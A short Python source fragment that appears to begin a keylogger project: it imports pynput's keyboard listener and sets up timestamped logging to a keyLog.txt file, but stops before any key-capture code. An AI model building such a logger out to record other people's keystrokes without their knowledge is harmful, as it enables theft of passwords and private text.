import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir = r"C:\Users\sassa\OneDrive\Documents\GitHub\KeyLogger\pynput.py"
logging.basicConfig(filename= (log_dir + r"/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
